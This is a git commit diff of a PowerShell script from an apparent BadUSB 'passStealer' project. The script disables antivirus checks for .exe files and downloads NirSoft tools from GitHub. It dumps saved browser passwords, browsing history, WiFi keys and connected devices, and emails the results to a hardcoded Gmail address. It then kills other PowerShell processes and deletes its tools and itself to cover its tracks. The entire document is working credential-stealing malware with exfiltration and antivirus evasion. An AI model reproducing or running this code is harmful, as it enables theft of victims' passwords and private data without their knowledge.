45e50578cd673132201b01a8c21aed6c5b3af44b
MrHacker061 <121785937+MrHacker061@users.noreply.github.com>
2023-01-02 23:49:22 -0700

    Update ciaoV2.ps1

--- ciaoV2.ps1
+++ ciaoV2.ps1
@@ -1,8 +1,14 @@
 Set-Location C:\Users\Public\Documents #Go to the folder in which we will donwload files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
 Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 .\WebBrowserPassView.exe /stext passwords.txt #Create the file for Browser passwords
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt #Create the file for Browser history
+.\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
+.\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
 Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
 #Set mail option
 $SMTPServer = 'smtp.gmail.com'
@@ -15,11 +21,19 @@ $ReportEmail.To.Add('bocaj2024@gmail.com') #Email in which you want to receive t
 $ReportEmail.Subject = 'ChromePassStealerV2'
 $ReportEmail.Body = 'Attached is your list of informations.'
 $ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
- $SMTPInfo.Send($ReportEmail) #Send mail
+$ReportEmail.Attachments.Add('C:\Users\Public\Documents\history.txt')
+$ReportEmail.Attachments.Add('C:\Users\Public\Documents\wifi.txt')
+$ReportEmail.Attachments.Add('C:\Users\Public\Documents\connected_devices.txt')
+$SMTPInfo.Send($ReportEmail) #Send mail
 Start-Sleep -Seconds 15 #Wait 15 seconds
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Start-Sleep -Seconds 30 #Wait 30 seconds
 #Delete nirsoft tools and .ps1 file
+Remove-Item BrowsingHistoryView.exe
+Remove-Item WNetWatcher.exe
+Remove-Item WNetWatcher.cfg
+Remove-Item WirelessKeyView.exe
+Remove-Item WebBrowserPassView.exe
 Remove-Item ciaoV2.ps1
 Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
